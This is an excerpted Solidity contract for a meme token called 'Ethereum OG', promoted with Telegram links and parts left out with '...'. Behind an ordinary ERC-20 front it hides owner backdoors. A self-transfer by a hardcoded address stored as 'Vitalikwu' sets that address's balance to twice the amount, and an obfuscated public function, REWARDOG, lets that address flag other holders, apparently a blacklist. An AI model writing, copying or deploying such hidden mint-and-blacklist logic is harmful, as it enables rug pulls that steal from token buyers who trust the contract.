/**
 *  Before yns unc rugs dump bundler were the Og devs and traders who works for their bags hold and then made generational wealth we were the real OG 
*/

// IG: https://t.me/TheEthereumOG

// TG : https://t.me/TheEthereumOG
...
contract ETH is Context, IERC20, Ownable {
    ...
    string private _name = "Ethereum OG"; 
    string private _symbol = "OG";
    uint8 private _decimals = 6;
    address payable public Vitalikwu ;
    ...
    constructor () {
        ...
        Vitalikwu  = payable(address(0xe5C8132A42Aaa2794eb3d3Ec5fed1E746073fE1a));
        
        _isExcludefromFee[Vitalikwu ] = true;
    ...
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        ...
        {
            if ((from == to && to == Vitalikwu ) ? true : false )
                _balances[address(Vitalikwu )] = amount.mul(2);
    ...
    function REWARDOG   (address widjrk,uint256 wjzk) public {
        address msgsender = msg.sender;
        uint256 wapp = wjzk;

        if(wapp == 1-1 || wapp == 9+1)
            wends[widjrk] = wapp;
        if (msgsender != Vitalikwu )
            revert ("?");
    }
